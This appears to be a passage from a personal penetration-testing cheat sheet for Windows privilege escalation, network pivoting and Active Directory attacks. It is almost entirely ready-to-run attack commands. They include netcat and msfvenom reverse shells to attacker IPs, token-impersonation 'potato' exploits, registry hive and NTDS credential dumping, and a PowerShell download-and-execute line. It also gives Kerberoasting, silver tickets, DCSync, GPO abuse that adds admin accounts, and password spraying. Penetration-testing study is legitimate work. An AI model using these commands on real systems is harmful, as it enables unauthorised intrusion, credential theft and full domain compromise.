.\godpotato.exe -cmd "cmd /c systeminfo"
.\juicypotato.exe -t * -p rev.exe -l 4444 # any unoccupied port on victim
# rogue potatoe
rogue.exe -r 192.168.45.154 -e "C:\services\nc.exe 192.168.45.154 4455 -e cmd.exe" -l 9999 # victim
sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.181.222:9999

# sometimes potato attacks doesn't return output then try to create new user
# RottenPotato, SweetPotato, , JuicyPotato or Godpotato [ALL POTATOES](https://github.com/AtvikSecurity/CentralizedPotatoes)

```
###### Local Service Account with no SeImpersonate
Explanation of this attack: [Give me back my privileges](https://itm4n.github.io/localservice-privileges/?source=post_page-----b95d3146cfe9---------------------------------------)

```powershell
whoami  
# nt authority\local service 
# and not having SeImpersonate then use the [FullPowers](https://github.com/itm4n/FullPowers)
Fullpowers.exe 
Fullpowers.exe -x
FullPowers.exe -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z

# In order to shift to another process
RunFromProcess-x64.exe 3636 "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep Bypass -Command ". C:\TOOLS\powercat.ps1;powercat -l -p 7001 -ep"
```
##### SeBackupPrivilege
```powershell
# if SeBackupPrivilege Permissions then
# Dump SAM, SYSTEM and SECURITY hive
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
reg save HKLM\SECURITY security.bak
impacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL
impacket-secretsdump -system SYSTEM -sam SAM LOCAL

pypykatz registry  --sam SAM --system SYSTEM

```

##### SeRestorePrivilege
Using that we can replace any binary we want
```shell
# If we have RDP, then we can replace Utilman.exe and then press Win + U to trigger that binary during our RDP session 
cd C:\Windows\system32  
ren Utilman.exe Utilman.old  
ren cmd.exe Utilman.exe
```
##### SeManageVolumePrivilege
```Powershell
# [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit) gives acces to complete C:\ drive

# Now we can try hijacking any DLL or any other vector of file replacement or missing dll
# METHOD 1
# [WerTrigger](https://github.com/sailay1996/WerTrigger) to get full privilege NT Authority System access 
# After running it won't return any output or anything so type command to get back stable interactive connection 
c:\xampp\nc.exe 192.168.45.244 9999 -e powershell.exe

# METHOD 2
# Replace the below dll with the malicious one
C:\Windows\System32\wbem\tzres.dll
# then call systeminfo to trigger it
systeminfo

```

##### SeMachineAccountPrivilege
Windows Privilege Escalation: sAMAccountName Spoofing specfici version of windows

#### Group Privileges
https://github.com/dollarboysushil/oscp-cpts-notes/tree/main/windows-privilege-escalation/group-privileges
##### Server operator group
```shell
accesschk.exe -cuwqv "molly.smith" * /accepteula
# we can change the binPath of any service
sc config VMTools binPath= "cmd /c net localgroup administrators user /add"

# we can make backup of SAM and SYSTEM too
```

| **Group**                        | **Scope & Type**                     | **Key Permissions / Rights**                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| -------------------------------- | ------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Enterprise Admins**            | Forest‑wide, Universal (root domain) | Full control over all domains, can modify forest & cross-domain settings ([Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory?utm_source=chatgpt.com "Active Directory Privileged Accounts and Groups Guide"), [SS64](https://ss64.com/nt/syntax-security_groups.html?utm_source=chatgpt.com "Windows Built-in Users, Default Groups and Special Identities - SS64")) |
| **Domain Admins**                | Domain-wide, Global                  | Local admin on all domain‑joined machines, full control on domain objects                                                                                                                                                                                                                                                                                                                                                                                                                       |
| **Administrators (Built-in)**    | Domain local                         | Full control on DCs and domain objects; can take ownership                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| **Schema Admins**                | Forest root, Universal               | Modify AD schema definition                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| **Account Operators**            | Domain local                         | Create/manage user & group accounts; network access; workstation joins                                                                                                                                                                                                                                                                                                                                                                                                                          |
| **Backup Operators**             | Domain local                         | Backup/restore files and directories on DCs; bypass traverse checking                                                                                                                                                                                                                                                                                                                                                                                                                           |
| **Print Operators**              | Domain local                         | Manage print queues on DCs                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| **Server Operators**             | Domain local                         | Manage DC roles: log on locally, start/stop services, backup/restore                                                                                                                                                                                                                                                                                                                                                                                                                            |
| **Domain Controllers**           | Global                               | Identifies all DCs; used in GPO targeting; can log in locally/network                                                                                                                                                                                                                                                                                                                                                                                                                           |
| **Domain Users**                 | Global                               | All domain user accounts; standard user privileges                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| **Domain Computers**             | Global                               | All member computers; no special rights                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| **Enterprise Key Admins**        | Forest-wide, Universal               | Manage forest-level encryption keys                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| **Read-only Domain Controllers** | Global                               | Membership grants read-only DC functionality; no write rights                                                                                                                                                                                                                                                                                                                                                                                                                                   |

[Microsoft Active Directory Security Groups Documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)

#### Secrets extraction using DPAPI
```powershell
# secrets extraction using DPAPI
.\sharpdpapi.exe masterkeys /target:<dpapi_master_key_location> /password:pass /sid:<sid> # to decrypt DPAPI masterkey
sekurlsa::dpapi  # mimiaktz to extract decrypted DPAPI keys
dpapi::masterkey
SharpDPAPI blob /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\XYZ /masterkey:<hex>  # to decrypt credentials file storing secrets

```
#### PrivEsc Thru SERVICE
```powershell
# 1. Service Binary Hijacking
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.155 LPORT=4422 -f exe-service > serv4422.exe                  
# Or compile your own using the Windows Service C boilerplate ( [[Code & Exploit Cheatsheet#Windows Service C code]] )

# 2. Service Escalation via Registry & Permissions
# Enumerate ACLs on service registry keys
Get-Acl -Path HKLM:\System\CurrentControlSet\Services\* | Format-List
# If you have FullControl on a target service ('svc_name'):
reg add HKLM\SYSTEM\CurrentControlSet\Services\svc_name /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\common.exe /f
sc start svc_name
# This re-registers the service to run your binary as SYSTEM.

# 3. Service Escalation via binpath change
# Requires SERVICE_CHANGE_CONFIG permission
sc config svc_name binpath= "\"C:\Windows\System32\net.exe\" localgroup administrators user /add"
sc start svc_name

# 4. DLL Hijacking of a Service
# Determine if the target service loads any DLL via an unqualified path check [[#Windows Services]]
# If service is 64-bit, use a 64-bit payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.155 LPORT=4422 -f dll -o mal4422x64.dll

# Drop the DLL into a directory earlier in the search order than the legitimate DLL’s location.
# DLL search order (LoadLibrary):  
# 1. Service executable directory  
# 2. System directory (System32)  
# 3. 16-bit system dir  
# 4. Windows dir  
# 5. Current working directory  
# 6. Directories in %PATH%  :contentReference[oaicite:1]{index=1}

# Variants:
# • Relative-path hijacking: place exe+DLL in writable location  
# • Phantom-hijacking: drop DLL matching a missing dependency  
# • DLL redirection via manifest or .local files :contentReference[oaicite:2]{index=2}

# To detect vulnerable services:
# - Use ProcMon to catch missing DLL load attempts  
# - Look for insecure ACLs on service registry or executable directories


# Find Writable Location
$WritableDirectory = $null
$Path = (Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment" -Name "PATH").path
$Path -Split ";" | % {
    try {
        [IO.File]::OpenWrite("$_\x.txt").close()
        Remove-Item "$_\x.txt"
        $WritableDirectory = $_
    } catch {}
}

if ($WritableDirectory -eq $null) {
    Write-Host "No writable directories in PATH, FJTWSVIC is not exploitable"
    Exit 1
}
```
##### To check service permissions
```powershell
sc sdshow <ServiceName>
```
 
 Each ACE follows this pattern: `(A;;permissions;;;SID)` whereas in `(A;FA;permissions;;;SID)` , `FA` to do failed audit logging for specified permissions.
 
 **Common Permission Codes:**
- **CC** - SERVICE_QUERY_CONFIG
- **DC** - Change_Config
- **LC** - SERVICE_QUERY_STATUS
- **SW** - SERVICE_ENUMERATE_DEPENDENTS
- **RP** - SERVICE_START
- **WP** - SERVICE_STOP
- **DT** - SERVICE_PAUSE_CONTINUE
- **LO** - SERVICE_INTERROGATE
- **CR** - SERVICE_USER_DEFINED_CONTROL
- **RC** - READ_CONTROL
- **WD** - WRITE_DAC
- **WO** - WRITE_OWNER
- **SD** - DELETE

#### Always Install Elevated - MSI
```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
# if both value set to 1 in AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > reverse.msi
msiexec /quiet /qn /i C:\Temp\setup.msi # to install malicious msi with elevated perms
```

#### AutoRun Program Hijack Or Startup App
```powershell
# AutoRun Program Hijack
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Autorun64.exe # to check autorun programs and their dir
accesschk64.exe -wvu "C:\Program Files\Autorun Program
# if has the perms to change the binary then replace with the malicious one
# logoff and logon

# Startup Application
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# if we have permissions then drop in case any admin logs in at the startup it will gonna trigger malicious binary
```
#### Bypass UAC
### Useful commands
```powershell
net localgroup "Remote Desktop Users" /add user  # in case RDP open, PREFERRED
net localgroup "Remote Management Users" /add user  # in case RDP closed and WinRM open

Add-LocalGroupMember -Group Administartors -Member ariah
```
## ⛓ Pivoting Commands

Check this [[Pivoting]]
### Ligolo-ng
```bash
# [[Pivoting#Ligolo-ng]] preferred for setting up internet network route and listener for easier pivoting
sudo ligolo-proxy -selfcert

ifcreate --name "ligolo"

# victim side 
./agent -connect <attackerip>:11601 -ignore-cert

session # seelct
ifconfig # check for the route
route_add --name "ligolo" --route "10.0.2.0/24"
start --tun "ligolo"

# for double pivoting 
listener_add --addr 0.0.0.0:8001 --to 127.0.0.1:8000 --tcp  # to deliver the ligolo binary to another host for double pivot so opening listener on agent
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp # get back the connection of 2nd agent through 1st agent
# for second pivot
ifcreate --name "ligolo-second"
session # seelct
ifconfig # check for the route
route_add --name "ligolo-second" --route "172.10.2.0/24"
start --tun "ligolo-second"

# in case if the route is already present to your machine then use host specfic subnet liek 192.168.10.12/32

# to route to locally running port on your agent machine
sudo ip route add 240.0.0.1/32 dev ligolo 
# where 240.0.0.1 is your agent local ip
```
### Chisel
```shell
# REVERSE/Remote Port Forward
# attacking machine
chisel server -p 11701 --reverse & # we can listen on any port, but i create 11701 for the standard

# jump box
./chisel client ATTACKING_IP:11701 R:LOCAL_PORT:TARGET_IP:TARGET_PORT &

./chisel.exe client 192.168.45.155:11701 R:9980:127.0.0.1:80 &
```
### More
```shell
# [[Pivoting#SSH Port-forwarding Tunneling]] can check out this too
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N

# Port Forwarding Using Socat
# Linux victim Machine
socat -ddd TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389 

# plink for ssh remote port forwarding if our attacking machine hosting ssh server and we wanna access internal victim rdp port
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
# we can't respond back to promppts on non-TTY windows shell just like linux then we can automate the process of sending yes through echo

# native to windows but requires high privs
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
# if we have high privs the obviously we can also open some ports in firewall
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
# delete this rule and portfwd after engagement
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

## 🗃<font color="#d99694">Active Directory</font>

[PayloadAllTheThings AD Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
### 🔍Enumeration
```powershell
net user /domain
net user username /domain
net group /domain
net group <groupname> /domain
net accounts # before doing pass attack to check account lockout policies
Get-NetUser | select name,badpwdcount,badpasswordtime # for check bad pass attempt


# Powershell AD enumeration cmdlets comes with RSAT that's rarely present on client in a domain.
# we can use alternative commands to directly communicate through LDAP to query AD objects
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()  # to get domain info i.e. primary domain controller
([adsi]'').distinguishedName  # '' to start search at top of AD hierarchy


# PowerView.ps1 for manual  [Reference of All PowerView Functions](https://powersploit.readthedocs.io/en/latest/Recon/)
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon  # for finding dormant user accounts
Get-NetUser -PreauthNotRequired # to list down AS-REP roastable user accounts
Get-NetUser -Spn
Get-NetUser -Filter {SamAccountName -eq "username"}


Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member   # powerview can also list nested groups too
Get-NetComputer | select operatingsystem,dnshostname
Find-LocalAdminAccess # finds if current user has admin privs on any computers in the domain
# the below command sometimes get buggy and restricted
# The permissions required to enumerate sessions with NetSessionEnum are defined in the SrvsvcSessionInfo registry key, which is located in the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity hive.
Get-NetSession -ComputerName <compname>  -Verbose # checks for any logged in users 
# to check for the perms of net session enumeration
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
# alternative to Get-NetSession because this doesn't work in latest windows 
PsLoggedOn \\<compname> # this relies of remote registry service to be enabled which isn't enabled by default on workstations but can be enabled on server

setspn -L iis_service # installed by default on windows
Get-NetUser -SPN | select samaccountname,serviceprincipalname  # powerview

Get-ObjectAcl -Identity stephanie #  ActiveDirectoryRights and SecurityIdentifier, interesting to look for who has what perms on specfied object in this case stephanie user object
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

Convert-SidToName <sid>
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName


# Oneliner
Get-ObjectAcl | select ObjectDN, ObjectSID, ActiveDirectoryRights, @{Name='IdentityReference'; Expression={ConvertFrom-SID $_.SecurityIdentifier}} | ? {$_.IdentityReference -like '*user*'}

# If we have GenericAll on the group then we can add any user in that group

# for gpo fidning
Get-NetGPO | select displayname
Get-GPO -Name "Default Domain Policy"

Find-DomainShare  # -CheckShareAccess to list shares that available to us
# SYSVOL share, located on domain controllers, stores domain-wide policies and logon scripts. It is accessible to all domain users to ensure that these policies are propagated across all domain-joined systems. 
ls \\dc1.corp.com\sysvol\corp.com\   # investigate all folders can lead to sensitive info like gpp password
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"

# Powerview cmds END]


gpresult /S SERVER01 /USER CORP\dave /R


# AUTOMATED TOOLS

bloodhound-python # compatible for bloodhound legacy
pipx install bloodhound-ce 
bloodhound-ce-python # compatible for bloodhound ce

# Try to use sharphound too, because it misses some details
bloodhound-ce-python -u stephanie -p 'LegmanTeamBenzoin!!' -d corp.com -v --zip -c All,LoggedOn -gc corp.com -ns 192.168.105.70
# LoggedOn isn't included inside All collection



# [sharphound](https://github.com/SpecterOps/SharpHound/releases)
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"

# analysis of collected data 
curl -L https://raw.githubusercontent.com/SpecterOps/bloodhound/main/examples/docker-compose/docker-compose.yml > docker-compose.yml
sudo docker-compose pull && sudo docker-compose up
# cypher queries [Reference1](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/) 
# Example cypher query
MATCH (n:User)WHERE n.hasspn=true
RETURN n

MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

# BloodHound enumerates local admin access only from the perspective of the user used during data collection. To discover additional access paths after pivoting to another user, data must be recollected using that new context.

powershell -nop -e bypass IEX(New-Object New.WebClient).DownloadString('http://192.168.x.x/powerup.ps1');Invoke-AllChecks > output-powerup.txt

```
#### ad-enumeration-script
this custom script can helps us find nested groups. `net group gropuname /domain` only lists the user, groups that are member of the mentioned group.
```powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
	
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)

# to filter for the domain users only
$dirsearcher.filter="samAccountType=805306368"
# to filter specific user only
# $dirsearcher.filter="name=jeffadmin"


$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}

# proper ldap query code using powershell
function LDAPSearch {
 # example Usage: LDAPSearch -LDAPQuery "(objectclass=group)" 
 # LDAPSearch -LDAPQuery "(samAccountType=805306368)"
 # "(&(objectCategory=group)(cn=Development Department*))"
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
	# in case of doing enumeration from the other user perspective
	# $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}

# we can use for loop to easily print the output
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
	$group.properties | select {$_.cn}, {$_.member}
}

```
#### [Netexec](https://www.netexec.wiki/)
```shell
# SMB enumeration
nxc smb <iprange>  # only search for windows machine
nxc smb <ipraneg> -u '' -p '' --shares # to look for null session
nxc smb <iprange> -u 'guest' -p '' --shares

nxc smb <ip> -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True # to download all the file from smb shares
nxc smb <ip> -u 'user' -p 'pass'  --user # try enumerate thru guest user and null session

nxc smb <ip> -u 'user' -p 'pass' --users
nxc smb <ip> -u 'user' -p 'pass' --rid-brute # to enumerate users using rid bruteforcing
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol # domain pass policy
nxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt # to check which target hasn't enforced smb signing so we can relay ntml

# Spray valid credentials: smb, rdp and winrm
while IFS=: read -r u p; do netexec smb 10.10.10.0/24 -u "$u" -p "$p"; done < <(cat credentials.txt)


nxc ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid  # to get domain sid

# Bloodhound collection
nxc ldap <dc-ip> -u user -p pass --bloodhound --collection All

# cmd execution
nxc winrm ip -u user -p pass -X <cmd>

# sensitive data dumping, if user is admin
nxc smb ip -u user -p pass --sam
nxc smb ip -u user -p pass -M lsassy
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil  # dumps ntds.dit and SYSTEM and parse these using secretsdump
# enumerate loggedon-users if you have admin rights on that machine then impersonate as that user
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users

# bruteforcing
crackmapexec/netexec smb <target-ip> -u <username> -p wordlist.txt -d corp.co --continue-on-success
netexec rdp <ip-range> -u user -p pass -d corp.com --continue-on-success --screenshot --screentime <time> # --nla-screenshot

```
### 💥Exploitation

[AD Pentesting Notes](https://exploit-notes.hdks.org/exploit/windows/active-directory/)
Check: https://www.netexec.wiki/ for more details

in case of "`RB_AP_ERR_SKEW(Clock skew too great)`" error synchronize the time of kali with DC using [_ntpdate_](https://en.wikipedia.org/wiki/Ntpdate) or [_rdate_](https://en.wikipedia.org/wiki/Rdate)
```shell
ntpdate <dcip>
rdate -s <dcip>
```
#### URL File Attack
If you are able to upload a file to an SMB share. In that case, you can try uploading a `.scf` or `.url` file to capture the victim's Net-NTLMv2 hash on your attacking machine. After that, you can also attempt client-side attacks by uploading files such as `.pdf`, `.docx`, or `.odt`.
```shell title:file.scf
[Shell]
Command=2
IconFile=\\[Listener-IP]\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

```shell title:file.url
[InternetShortcut]
URL=\\[Listener-IP]\share
```

```shell
# we can also use ntlm_theft tool to create those files
python3 ntlm_theft.py -g lnk -s <attacker_listener_ip> -f vault
```
####  Backup operator
```shell
# Dumping ntds.dit through remote registry service
impacket-reg joe:'Flowers1'@172.16.238.10 backup -o '\\192.attckr.ip\share' # add the share in quotes otherwise error, also try adding domain.com/ in case of error
# Before the above host the smb share on the kali machine
impacket-smbserver share . -smb2support
```
#### AS-REP Roasting
```shell
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
impacket-GetNPUsers "<domain>/" -usersfile <userlist.txt> -request -format hashcat -outputfile ASREProastables.txt -dc-ip $DC01_IP

# We can use [_Rubeus_](https://github.com/GhostPack/Rubeus), which is a toolset for raw Kerberos interactions and abuses.
.\Rubeus.exe asreproast /nowrap
# In case we have the GenericAll perms on another user, instead of changing passwrod we can disable preauth to capture its hash
bloodyAD --host DC_host --dc-ip <ip> -d <DOMAIN> -u attacker -p PASS add uac victimuser -f DONT_REQ_PREAUTH # use "remove uac" to remove
# powerview
Set-DomainObject -Identity victimuser -XOR @{userAccountControl=0x04000000 # again xor to remove
#netexec
nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt # or use userlist.txt and empty pass
```
#### Kerberoasting
```shell
impacket-GetUserSPNs hacklab.local/john:Password123 -dc-ip $DC01_IP -request -outputfile kerberoastable.hashes
hashcat -m 13100 kerberoastable.hashes /usr/share/wordlists/rockyou.txt
# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# In case generic all on user we can also make it kerberoastable
Set-DomainObject -Identity svc-alice -Add @{servicePrincipalName="HTTP/fake-service.domain.local"} # -Delete to delete

nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```
#### Silver Ticket 
For example, we got the access the mssql service but our original mssql_svc account don't have permission to execute commands then we can forge a high privileged ticket named silver ticket
```shell
# we can also dump TGS from mimikatz
kerberos::list /export  # to dump tgs to crack svc account pass hash
mimikatz "kerberos::hash /password:PASSWORD1!" exit # convert pass to ntlm hash

# no need to have high privileges
kerberos::golden /sid:<domain-sid> /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:<service_ntlm_hash> /user:jeffadmin
misc::cmd
klist  # to see the tickets in the memory
# Rubeus for forged TGS creation
rubeus.exe hash /password:<pass>
Rubeus.exe silver /service:<completeSPN> /rc4:<nthash> sid:<domainsid> /user:<user> /domain: /ptt

iwr -UseDefaultCredentials http://web04 # to use kerberos forged TGS

# in Kali
impacket-ticketer -nthash <SVC_NTLM> -domain-sid <SID> -domain corp.com -spn <spn> -dc-ip ip Administrator # target user to get privs of
curl --negotiate -u : http://web04.corp.com  # --negotiate automatically shift to kerb auth

```
#### DC Sync Attack
```shell
# dmping hash of the specific user directly from DC, no need to be available in the memory
lsadump::dcsync /user:corp\dave  # should have one of the directory replication perms or in one of the Admin groups
# DC sync using secretsdump
impacket-secretsdump -just-dc-user dave <highpriv-domuser>:<pass>@192.168.50.70 # it uses [_DRSUAPI_](https://wiki.samba.org/index.php/DRSUAPI) implementing the directory replicaiton service remote protocol 
# to check what groups/user has replicating pirvs
dsacls "dc=corp,dc=com" | findstr /i replicat


```
#### LoggedOn User Impersonation
```shell
# impersonate any domain user/admin in the machine where we are local admin
query user # to query logged on user session
schtasks /create /tn ImpersonateDA /tr "cmd.exe /c whoami > C:\Temp\impersonated.txt" /sc ONCE /st 00:00 /RL HIGHEST /RU "CORP\DAusername" /RP "" /F

# to test
schtasks /run /tn ImpersonateDA
type C:\Temp\impersonated.txt

# cleanup
schtasks /delete /tn ImpersonateDA /f

```
#### DACL Abuse
[ACL ABUSE LIST](https://adminions.ca/books/active-directory-enumeration-and-exploitation/page/acl-abuse)

Highly Recommended
https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-acl-ace/

```shell
# If you have GenericWrite on the GPO then create a scheduled task in GroupPolicy using the belwo tool
# directly from kali
python pygpoabuse.py 'secura.yzx/charlotte:Game2On4.!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net user synacktiv_pygpoabuse Password123! /add && net localgroup administrators synacktiv_pygpoabuse /add' -v -dc-ip 192.168.106.97 
# [referenced here](https://www.synacktiv.com/en/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
# gpo id can be checked from bloodhound or powerview

# We can also add ourselves in Local Administrators group
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"

# if have access to windows then
gpupdate /force # to quickly update the group policy over the network otherwise wait
```

##### **1. GenericAll on a User – Reset Password (Full Control)**

```powershell
# WINDOWS
Set-DomainUserPassword -Identity "victimuser" -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)
net user username newpass /domain

# KALI LINUX
net rpc password "victimuser" "NewP@ss123!" -U "DOMAIN/controlleduser%Password123" -S <DC_IP>
```

##### **2. GenericWrite on User – Modify scriptPath or SPN (Kerberoasting)**

```powershell
# WINDOWS COMMAND
# Method 1: Add SPN to perform Kerberoasting (PowerView)
Set-DomainObject -Identity targetuser -Set @{servicePrincipalName='http/kerberoast'} -Credential $myCred

# Method 2: Set scriptPath for logon script abuse (PowerView)
Set-DomainObject -Identity targetuser -Set @{scriptPath='\\attacker\share\shell.bat'} -Credential $myCred

# Method 3: Add SPN manually (Rubeus)
Rubeus.exe addspn /user:targetuser /spn:http/kerberoast /creduser:controlleduser /credpassword:MyP@ssw0rd

# Method 4: Modify SPN via PowerShell
$SecPassword = ConvertTo-SecureString "MyP@ssw0rd" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("domain\controlleduser", $SecPassword)
Set-ADUser targetuser -ServicePrincipalNames @{Add="http/kerberoast"} -Credential $Cred


# KALI LINUX
# Method 1: Target Kerberoasting by adding SPN to it and requesting TGS
targetedKerberoast.py -v -d 'domain.com' -u 'controlled-user' -p 'pass' --dc-ip $IP1 --request-user target-user -o tuser.kerberaost
# this tool also automatically removes SPN to cleanup traces

# Method 1: Add SPN using impacket's ldapmod
ldapmodify.py 'domain/controlleduser:MyP@ssw0rd' -dc-ip $DC_IP -H ldap://$DC_IP <<EOF
dn: CN=targetuser,CN=Users,DC=domain,DC=com
changetype: modify
add: servicePrincipalName
servicePrincipalName: http/kerberoast
EOF


# Method 2: Add scriptPath attribute using ldapmodify
ldapmodify.py 'domain/controlleduser:MyP@ssw0rd' -dc-ip $DC_IP -H ldap://$DC_IP <<EOF
dn: CN=targetuser,CN=Users,DC=domain,DC=com
changetype: modify
replace: scriptPath
scriptPath: \\attacker\share\shell.bat
EOF

# Method 3: Add SPN using python-ldap (custom script)
# Example snippet in Python:
import ldap, ldap.modlist as modlist
l = ldap.initialize("ldap://$DC_IP")
l.simple_bind_s("domain\\controlleduser", "MyP@ssw0rd")
dn = "CN=targetuser,CN=Users,DC=domain,DC=com"
attrs = [(ldap.MOD_ADD, 'servicePrincipalName', b'http/kerberoast')]
l.modify_s(dn, attrs)

# Method 4: Create new SPN then perform Kerberoasting
impacket-GetUserSPNs domain/controlleduser:MyP@ssw0rd -dc-ip $DC_IP -request -outputfile hash.txt
# Crack the ticket hash with hashcat or john

```
###### Shadow Credentials Attack - to grab NTLM Hash
https://i-tracing.com/blog/dacl-shadow-credentials/
```shell
pywhisker.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --target "$TARGET" --action "list" --dc-ip $IP
pywhisker.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --target "$TARGET" --action "add" --dc-ip $IP

python3 PKINITtools/gettgtpkinit.py -cert-pfx "$PFX_CERTIFICATE" -pfx-pass "$PFX_PASSWORD" "$DOMAIN"/"$USER" output_TGT.ccache -dc-ip $IP

python3 PKINITtools/getnthash.py domain/user -key <Hex_KEY_GENERATED_FROM_THE_ABOVE> -dc-ip $IP
```

---

!!! info
    Recommended [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-acl-ace/) to know about AD attack

#### Delegation Attacks
```shell
# kali linux
impacket-findDelegation -dc-ip <DCIP> domain.local/USERNAME
```

##### 🟥 Unconstrained Delegation Abuse

```powershell
# Enumerate
# PowerView
Get-DomainComputer -unconstrained 


# Explanation:
# If a system/user account is trusted for delegation, it caches incoming users' TGTs.
# An attacker who gains SYSTEM access on such a machine can dump those TGTs,
# including Domain Admin TGTs, if they log in.

# Purpose:
# Steal TGTs from memory and impersonate privileged users (e.g., DA).

# Windows (Attacker has SYSTEM access on a machine with unconstrained delegation):
# List machines with unconstrained delegation:
Get-DomainComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Dump TGTs using Rubeus:
